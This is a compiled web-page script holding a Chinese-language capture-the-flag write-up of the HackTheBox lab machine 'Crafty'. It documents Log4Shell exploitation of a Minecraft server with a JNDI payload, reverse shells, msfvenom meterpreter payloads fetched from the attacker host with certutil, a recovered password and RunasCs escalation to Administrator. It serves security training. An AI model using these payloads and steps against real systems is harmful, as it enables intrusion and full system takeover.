"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[74962],{5216:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>i,contentTitle:()=>l,default:()=>p,frontMatter:()=>o,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"HackTheBox/Machines/Crafty/index","title":"Crafty","description":"Difficulty: Easy","source":"@site/docs/HackTheBox/Machines/Crafty/index.md","sourceDirName":"HackTheBox/Machines/Crafty","slug":"/HackTheBox/Machines/Crafty/","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Crafty/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Machines/Crafty/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Codify","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Codify/"},"next":{"title":"Devvortex","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Devvortex/"}}');var a=r(74848),t=r(28453);const o={},l="Crafty",i={},c=[{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"\u57fa\u4e8e Minecraft \u8fdb\u884c Log4j \u653b\u51fb",id:"\u57fa\u4e8e-minecraft-\u8fdb\u884c-log4j-\u653b\u51fb",level:2},{value:"\u8fde\u63a5\u670d\u52a1\u5668",id:"\u8fde\u63a5\u670d\u52a1\u5668",level:3},{value:"\u6784\u5efa Log4j \u653b\u51fb\u8f7d\u8377",id:"\u6784\u5efa-log4j-\u653b\u51fb\u8f7d\u8377",level:3},{value:"\u53d1\u9001 Log4j \u8f7d\u8377",id:"\u53d1\u9001-log4j-\u8f7d\u8377",level:3},{value:"User - crafty\\svc_minecraft",id:"user---craftysvc_minecraft",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u53cd\u5f39\u81f3 Metasploit",id:"\u53cd\u5f39\u81f3-metasploit",level:3},{value:"Minecraft \u63d2\u4ef6\u63a2\u6d4b",id:"minecraft-\u63d2\u4ef6\u63a2\u6d4b",level:2},{value:"\u63d2\u4ef6\u9006\u5411\u5206\u6790",id:"\u63d2\u4ef6\u9006\u5411\u5206\u6790",level:3},{value:"\u63d0\u6743\u81f3 administrator",id:"\u63d0\u6743\u81f3-administrator",level:3},{value:"User - Administrator",id:"user---administrator",level:2},{value:"flag - root",id:"flag---root",level:3}];function d(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"crafty",children:"Crafty"})}),"\n",(0,a.jsxs)(n.admonition,{type:"info",children:[(0,a.jsx)(n.p,{children:"Difficulty: Easy"}),(0,a.jsx)(n.p,{children:"Operating System: Windows"})]}),"\n",(0,a.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo nmap -A --min-rate=5000 -T5 -p- 10.10.11.249"',children:"PORT      STATE SERVICE   VERSION\n80/tcp    open  http      Microsoft IIS httpd 10.0\n|_http-title: Did not follow redirect to http://crafty.htb\n|_http-server-header: Microsoft-IIS/10.0\n25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u57fa\u4e8e-minecraft-\u8fdb\u884c-log4j-\u653b\u51fb",children:"\u57fa\u4e8e Minecraft \u8fdb\u884c Log4j \u653b\u51fb"}),"\n",(0,a.jsx)(n.h3,{id:"\u8fde\u63a5\u670d\u52a1\u5668",children:"\u8fde\u63a5\u670d\u52a1\u5668"}),"\n",(0,a.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,a.jsx)(n.a,{href:"https://github.com/ammaraskar/pyCraft",children:"ammaraskar/pyCraft - Github"})," \u4e0e\u670d\u52a1\u5668\u8fdb\u884c\u8fde\u63a5"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(env)(randark \u327f kali)-[~/tools/pyCraft]\n\u2514\u2500$ python3 start.py\nEnter your username: user123\nEnter your password (leave blank for offline mode):\nEnter server host or host:port (enclose IPv6 addresses in square brackets): 10.10.11.249\nConnecting in offline mode...\nConnected.\n"})}),"\n",(0,a.jsx)(n.h3,{id:"\u6784\u5efa-log4j-\u653b\u51fb\u8f7d\u8377",children:"\u6784\u5efa Log4j \u653b\u51fb\u8f7d\u8377"}),"\n",(0,a.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,a.jsx)(n.a,{href:"https://github.com/kozmer/log4j-shell-poc",children:"kozmer/log4j-shell-poc - Github"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tools/log4j-shell-poc]\n\u2514\u2500$ python3 poc.py --userip 10.10.16.3 --webport 80 --lport 9999\n\n[!] CVE: CVE-2021-44228\n[!] Github repo: https://github.com/kozmer/log4j-shell-poc\n\n[+] Exploit java class created success\n[+] Setting up LDAP server\n\n[+] Send me: ${jndi:ldap://10.10.16.3:1389/a}\n\n[+] Starting Webserver on port 80 http://0.0.0.0:80\nListening on 0.0.0.0:1389\n"})}),"\n",(0,a.jsx)(n.h3,{id:"\u53d1\u9001-log4j-\u8f7d\u8377",children:"\u53d1\u9001 Log4j \u8f7d\u8377"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(env)(randark \u327f kali)-[~/tools/pyCraft]\n\u2514\u2500$ python3 start.py\nEnter your username: user123\nEnter your password (leave blank for offline mode):\nEnter server host or host:port (enclose IPv6 addresses in square brackets): 10.10.11.249\nConnecting in offline mode...\nConnected.\n${jndi:ldap://10.10.16.3:1389/a}\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5728 Log4j \u8f7d\u8377\u670d\u52a1\u5668\u4e2d\u5f97\u5230"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'Send LDAP reference result for a redirecting to http://10.10.16.3:80/Exploit.class\n10.10.11.249 - - [27/Mar/2024 17:09:58] "GET /Exploit.class HTTP/1.1" 200 -\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u5728\u76d1\u542c\u5668\u4e2d\u5f97\u5230"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tools/log4j-shell-poc]\n\u2514\u2500$ rlwrap nc -lvnp 9999\nlistening on [any] 9999 ...\nconnect to [10.10.16.3] from (UNKNOWN) [10.10.11.249] 49681\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\users\\svc_minecraft\\server> whoami\nwhoami\ncrafty\\svc_minecraft\n"})}),"\n",(0,a.jsx)(n.h2,{id:"user---craftysvc_minecraft",children:"User - crafty\\svc_minecraft"}),"\n",(0,a.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"PS C:\\users\\svc_minecraft\\Desktop> type user.txt\ntype user.txt\ne706dc2e565ff1fa962c61ed39c083a9\n"})}),"\n",(0,a.jsx)(n.h3,{id:"\u53cd\u5f39\u81f3-metasploit",children:"\u53cd\u5f39\u81f3 Metasploit"}),"\n",(0,a.jsx)(n.p,{children:"\u751f\u6210\u8f7d\u8377"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tools/log4j-shell-poc]\n\u2514\u2500$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=8888 -f exe -o exp-8888.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of exe file: 7168 bytes\nSaved as: exp-8888.exe\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5f00\u542f http \u6295\u9012\u8f7d\u8377"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"python3 -m http.server 80\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u4e0b\u8f7d\u8f7d\u8377"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"PS C:\\users\\svc_minecraft\\Desktop> certutil -urlcache -f http://10.10.16.3/exp-8888.exe exp-8888.exe\ncertutil -urlcache -f http://10.10.16.3/exp-8888.exe exp-8888.exe\n****  Online  ****\nCertUtil: -URLCache command completed successfully.\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u542f\u52a8\u76d1\u542c\u5668"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tools/log4j-shell-poc]\n\u2514\u2500$ msfconsole -q\n[*] Starting persistent handler(s)...\nmsf6 > use multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set lhost 10.10.16.3\nlhost => 10.10.16.3\nmsf6 exploit(multi/handler) > set lport 8888\nlport => 8888\nmsf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.3:8888\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u6267\u884c\u8f7d\u8377"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"PS C:\\users\\svc_minecraft\\Desktop> .\\exp-8888.exe\n.\\exp-8888.exe\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u6536\u5230\u56de\u8fde\u7684 shell"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"msf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.3:8888\n[*] Sending stage (201798 bytes) to 10.10.11.249\n[*] Meterpreter session 1 opened (10.10.16.3:8888 -> 10.10.11.249:49687) at 2024-03-27 17:48:29 +0800\n\nmeterpreter > sysinfo\nComputer        : CRAFTY\nOS              : Windows Server 2019 (10.0 Build 17763).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 1\nMeterpreter     : x64/windows\n"})}),"\n",(0,a.jsx)(n.h2,{id:"minecraft-\u63d2\u4ef6\u63a2\u6d4b",children:"Minecraft \u63d2\u4ef6\u63a2\u6d4b"}),"\n",(0,a.jsx)(n.p,{children:"\u5728 Minecraft \u63d2\u4ef6\u76ee\u5f55\u4e2d\u53d1\u73b0"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"meterpreter > pwd\nC:\\users\\svc_minecraft\\server\\plugins\nmeterpreter > ls\nListing: C:\\users\\svc_minecraft\\server\\plugins\n==============================================\n\nMode              Size  Type  Last modified              Name\n----              ----  ----  -------------              ----\n100666/rw-rw-rw-  9996  fil   2023-10-28 05:48:53 +0800  playercounter-1.0-SNAPSHOT.jar\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5c06\u8fd9\u4e2a\u6587\u4ef6\u4e0b\u8f7d\u4e0b\u6765"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"meterpreter > download playercounter-1.0-SNAPSHOT.jar\n[*] Downloading: playercounter-1.0-SNAPSHOT.jar -> /home/randark/tools/log4j-shell-poc/playercounter-1.0-SNAPSHOT.jar\n[*] Downloaded 9.76 KiB of 9.76 KiB (100.0%): playercounter-1.0-SNAPSHOT.jar -> /home/randark/tools/log4j-shell-poc/playercounter-1.0-SNAPSHOT.jar\n[*] Completed  : playercounter-1.0-SNAPSHOT.jar -> /home/randark/tools/log4j-shell-poc/playercounter-1.0-SNAPSHOT.jar\n"})}),"\n",(0,a.jsx)(n.h3,{id:"\u63d2\u4ef6\u9006\u5411\u5206\u6790",children:"\u63d2\u4ef6\u9006\u5411\u5206\u6790"}),"\n",(0,a.jsxs)(n.p,{children:["\u4f7f\u7528 Jadx \u8fdb\u884c\u5206\u6790\n",(0,a.jsx)(n.img,{alt:"img",src:r(40663).A+"",width:"1799",height:"936"})]}),"\n",(0,a.jsx)(n.p,{children:"\u5728\u5176\u4e2d\u53d1\u73b0\u4e00\u4e2a\u5bc6\u7801"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"s67u84zKq8IXw\n"})}),"\n",(0,a.jsx)(n.h3,{id:"\u63d0\u6743\u81f3-administrator",children:"\u63d0\u6743\u81f3 administrator"}),"\n",(0,a.jsx)(n.p,{children:"\u751f\u6210\u4e00\u4e2a\u65b0\u7684 meterpreter \u8f7d\u8377"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=7777 -f exe -o exp-7777.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of exe file: 7168 bytes\nSaved as: exp-7777.exe\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u501f\u52a9 ",(0,a.jsx)(n.a,{href:"https://github.com/antonioCoco/RunasCs",children:"antonioCoco/RunasCs - Github"})," \u8fd9\u4e2a\u9879\u76ee"]}),"\n",(0,a.jsx)(n.p,{children:"\u4e0a\u4f20\u6587\u4ef6"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"meterpreter > pwd\nC:\\users\\svc_minecraft\\Desktop\nmeterpreter > upload /home/randark/exp-7777.exe\n[*] Uploading  : /home/randark/exp-7777.exe -> exp-7777.exe\n[*] Uploaded 7.00 KiB of 7.00 KiB (100.0%): /home/randark/exp-7777.exe -> exp-7777.exe\n[*] Completed  : /home/randark/exp-7777.exe -> exp-7777.exe\nmeterpreter > upload /home/randark/tools/RunasCs/RunasCs.exe\n[*] Uploading  : /home/randark/tools/RunasCs/RunasCs.exe -> RunasCs.exe\n[*] Uploaded 50.50 KiB of 50.50 KiB (100.0%): /home/randark/tools/RunasCs/RunasCs.exe -> RunasCs.exe\n[*] Completed  : /home/randark/tools/RunasCs/RunasCs.exe -> RunasCs.exe\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u542f\u52a8\u76d1\u542c\u5668"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ msfconsole -q\n[*] Starting persistent handler(s)...\nmsf6 > use multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set lhost 10.10.16.3\nlhost => 10.10.16.3\nmsf6 exploit(multi/handler) > set lport 7777\nlport => 7777\nmsf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.3:7777\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u4ee5 administrator \u6267\u884c\u8f7d\u8377"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"C:\\users\\svc_minecraft\\Desktop>.\\RunasCs.exe administrator s67u84zKq8IXw exp-7777.exe\n.\\RunasCs.exe administrator s67u84zKq8IXw exp-7777.exe\n\nNo output received from the process.\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u6536\u5230\u56de\u8fde"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"msf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.3:7777\n[*] Sending stage (201798 bytes) to 10.10.11.249\n[*] Meterpreter session 1 opened (10.10.16.3:7777 -> 10.10.11.249:49688) at 2024-03-27 18:11:33 +0800\n\nmeterpreter > sysinfo\nComputer        : CRAFTY\nOS              : Windows Server 2019 (10.0 Build 17763).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x64/windows\nmeterpreter > getuid\nServer username: CRAFTY\\Administrator\n"})}),"\n",(0,a.jsx)(n.h2,{id:"user---administrator",children:"User - Administrator"}),"\n",(0,a.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"meterpreter > pwd\nC:\\users\\administrator\\desktop\nmeterpreter > cat root.txt\nf51313ca3887cf040c75041795c610c6\n"})})]})}function p(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},40663:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image_20240356-175646-ca7ba3a2ed6fd6637f1056172b0fe340.png"},28453:(e,n,r)=>{r.d(n,{R:()=>o,x:()=>l});var s=r(96540);const a={},t=s.createContext(a);function o(e){const n=s.useContext(t);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:o(e.components),s.createElement(t.Provider,{value:n},e.children)}}}]);